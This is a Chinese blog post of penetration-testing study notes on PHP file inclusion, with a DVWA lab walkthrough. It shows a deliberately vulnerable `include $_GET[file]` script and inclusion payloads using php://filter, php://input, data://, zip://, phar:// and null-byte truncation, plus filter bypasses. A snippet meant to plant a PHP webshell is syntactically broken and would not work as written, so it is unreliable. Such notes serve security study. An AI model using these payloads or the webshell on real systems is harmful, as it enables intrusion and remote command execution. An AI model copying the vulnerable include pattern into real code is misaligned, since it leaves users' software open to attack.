{"title":"渗透测试笔记 - day28、29、30 文件包含","date":"2022-03-03T00:00:00.000Z","date_formatted":{"ll":"Mar 3, 2022","L":"03/03/2022","MM-DD":"03-03"},"link":"2022/03/03/渗透测试笔记 - day28、29、30 文件包含","updated":"2023-03-17T12:07:41.488Z","content":"<h2 id=\"文件包含的四个函数\">文件包含的四个函数<a title=\"#文件包含的四个函数\" href=\"#文件包含的四个函数\"></a></h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    include、require、include_once、require_once</span></span><br><span class=\"line\"><span class=\"comment\">    include:\t执行到include时才会加载文件，找不到被包含的文件时只会产生告警，但脚本继续运行。</span></span><br><span class=\"line\"><span class=\"comment\">    require:\t只要程序一运行就加载文件，找不到被包含的文件时会产生终止错误。</span></span><br><span class=\"line\"><span class=\"comment\">    once:\t若文件中代码已经被包含则不会再次包含</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"文件包含实验：\">文件包含实验：<a title=\"#文件包含实验：\" href=\"#文件包含实验：\"></a></h2>\n<h3 id=\"访问相对路径\">访问相对路径<a title=\"#访问相对路径\" href=\"#访问相对路径\"></a></h3>\n<p>新建php文件代码为：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"variable\">$_GET</span>[file];</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001897.png\" alt=\"image-20220308192141255\" loading=\"lazy\" class=\"φbp\"></p>\n<p>访问该页面</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001754.png\" alt=\"image-20220308192012652\" loading=\"lazy\" class=\"φbp\"></p>\n<p>传参访问当前文件夹下文件</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001641.png\" alt=\"image-20220308192239034\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"使用file协议访问绝对路径\">使用file协议访问绝对路径<a title=\"#使用file协议访问绝对路径\" href=\"#使用file协议访问绝对路径\"></a></h3>\n<p>（file协议只能使用绝对路径）</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001614.png\" alt=\"image-20220308192317702\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"使用php伪协议访问文件\">使用PHP伪协议访问文件<a title=\"#使用php伪协议访问文件\" href=\"#使用php伪协议访问文件\"></a></h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://filter/read=convert.base64-encode/resource=文件名（可以是相对路径也可以是绝对路径）</span><br></pre></td></tr></table></figure>\n<p>绝对路径：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001541.png\" alt=\"image-20220308194405322\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112001014.png\" alt=\"image-20220308194454192\" loading=\"lazy\" class=\"φbp\"></p>\n<p>相对路径：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002096.png\" alt=\"image-20220308194732793\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002545.png\" alt=\"image-20220308194525753\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002451.png\" alt=\"image-20220308194746754\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002200.png\" alt=\"image-20220308194755437\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"任意命令执行/木马上传\">任意命令执行/木马上传<a title=\"#任意命令执行/木马上传\" href=\"#任意命令执行/木马上传\"></a></h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://input</span><br></pre></td></tr></table></figure>\n<p>通过post传参实行任意命令执行。</p>\n<p>执行并抓包：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002691.png\" alt=\"image-20220308203432550\" loading=\"lazy\" class=\"φbp\"></p>\n<p>post命令</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002829.png\" alt=\"image-20220308203535729\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002026.png\" alt=\"image-20220308211415650\" loading=\"lazy\" class=\"φbp\"></p>\n<p>植入木马：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">fputs</span>(<span class=\"string\">&quot;touchcmd.php&quot;</span>,<span class=\"string\">&quot;w&quot;</span>),<span class=\"string\">&#x27;&lt;?php $_POST[&quot;cmd&quot;];?&gt;&#x27;</span>\t<span class=\"comment\">//或者</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;touchcmd1.php&quot;</span>,<span class=\"string\">&quot;w&quot;</span>),<span class=\"string\">&#x27;&lt;?php $_POST[&quot;cmd&quot;];?&gt;&#x27;</span>)</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"data伪协议\">data伪协议<a title=\"#data伪协议\" href=\"#data伪协议\"></a></h3>\n<p>利用条件：</p>\n<p>allow_url_fopen=On</p>\n<p>allow_url_include=On</p>\n<p>php version &gt; 5.2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=data://text/plain,&lt;?php phpinfo();?&gt;//或</span><br><span class=\"line\">?file=data://text/plain;base64,ZHNhZnNkZmFzZA%2b</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002665.png\" alt=\"image-20220308211415650\" loading=\"lazy\" class=\"φbp\"></p>\n<h1 id=\"hvv-day29-文件包含（2）\">hvv-day29 文件包含（2）<a title=\"#hvv-day29-文件包含（2）\" href=\"#hvv-day29-文件包含（2）\"></a></h1>\n<h2 id=\"zip协议\">zip协议<a title=\"#zip协议\" href=\"#zip协议\"></a></h2>\n<p>可用于绕过后缀名限制。</p>\n<p>利用条件：php version &gt; 5.2、开启fastCGI</p>\n<p>payload：?file=zip://1.zip%231.txt\t\t<a href=\"//xn--zip1-2f5fq5bn18geo2an63b4jv.txt\">//访问zip文件中的1.txt</a></p>\n<p><strong>实验：</strong></p>\n<p>新建1.txt并打包为1.zip</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002377.png\" alt=\"image-20220309190758379\" loading=\"lazy\" class=\"φbp\"></p>\n<p>访问</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002576.png\" alt=\"image-20220309190820984\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成。</p>\n<h2 id=\"phar协议\">phar协议<a title=\"#phar协议\" href=\"#phar协议\"></a></h2>\n<p>利用条件：一般无版本限制。</p>\n<p>payload：?file=phar://1.zip%231.txt\t\t<a href=\"//xn--zip1-2f5fq5bn18geo2an63b4jv.txt\">//访问zip文件中的1.txt</a></p>\n<h2 id=\"访问当前目录文件\">访问当前目录文件<a title=\"#访问当前目录文件\" href=\"#访问当前目录文件\"></a></h2>\n<p>payload：?file=phar://1.zip%231.txt</p>\n<p>1.txt中写入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">\t<span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"dvwa靶场（file_inclusion--medium-level）\">DVWA靶场（file_inclusion–Medium Level）<a title=\"#dvwa靶场（file_inclusion--medium-level）\" href=\"#dvwa靶场（file_inclusion--medium-level）\"></a></h2>\n<p>源码贴图：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002813.png\" alt=\"image-20220309213436151\" loading=\"lazy\" class=\"φbp\"></p>\n<p>直接双写绕过</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002297.png\" alt=\"image-20220309213547664\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"dvwa靶场（file_inclusion--high-level）\">DVWA靶场（file_inclusion–High Level）<a title=\"#dvwa靶场（file_inclusion--high-level）\" href=\"#dvwa靶场（file_inclusion--high-level）\"></a></h2>\n<p>源码贴图 ：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002153.png\" alt=\"image-20220309213619856\" loading=\"lazy\" class=\"φbp\"></p>\n<p>这里是设置了白名单，必须包含file或者page为include.php，才能绕过过滤。</p>\n<p>所以直接加个file再传目录完事。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002662.png\" alt=\"image-20220309214123296\" loading=\"lazy\" class=\"φbp\"></p>\n<h2 id=\"dvwa靶场（file_inclusion--impossible-level）\">DVWA靶场（file_inclusion–Impossible Level）<a title=\"#dvwa靶场（file_inclusion--impossible-level）\" href=\"#dvwa靶场（file_inclusion--impossible-level）\"></a></h2>\n<p>源码贴图：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002422.png\" alt=\"image-20220310191233007\" loading=\"lazy\" class=\"φbp\"></p>\n<p>白名单限制，目前来看文件包含漏洞利用是无解的。</p>\n<h1 id=\"hvv-day29-文件包含\">hvv-day29 文件包含<a title=\"#hvv-day29-文件包含\" href=\"#hvv-day29-文件包含\"></a></h1>\n<h2 id=\"00截断\">00截断<a title=\"#00截断\" href=\"#00截断\"></a></h2>\n<p>利用条件：php5.2.17</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112002724.png\" alt=\"image-20220310192830522\" loading=\"lazy\" class=\"φbp\"></p>\n<p>payload：?file=phpinfo.php%00</p>\n","prev":{"title":"渗透测试笔记 - day31、32、33 RCE","link":"2022/03/10/渗透测试笔记 - day31、32、33 RCE"},"next":{"title":"渗透测试笔记 - day24、25、26、27 文件上传","link":"2022/02/28/渗透测试笔记 - day24、25、26、27 文件上传"},"plink":"https://Lq0ne.github.io/2022/03/03/渗透测试笔记 - day28、29、30 文件包含/","toc":[{"id":"文件包含的四个函数","title":"文件包含的四个函数","index":"1"},{"id":"文件包含实验：","title":"文件包含实验：","index":"2","children":[{"id":"访问相对路径","title":"访问相对路径","index":"2.1"},{"id":"使用file协议访问绝对路径","title":"使用file协议访问绝对路径","index":"2.2"},{"id":"使用php伪协议访问文件","title":"使用PHP伪协议访问文件","index":"2.3"},{"id":"任意命令执行/木马上传","title":"任意命令执行&#x2F;木马上传","index":"2.4"},{"id":"data伪协议","title":"data伪协议","index":"2.5"}]}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"March 3, 2022","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2022/03/03/渗透测试笔记 - day28、29、30 文件包含/\" title=\"渗透测试笔记 - day28、29、30 文件包含\">https://Lq0ne.github.io/2022/03/03/渗透测试笔记 - day28、29、30 文件包含/</a>"},"reading_time":"791 words in 5 min"}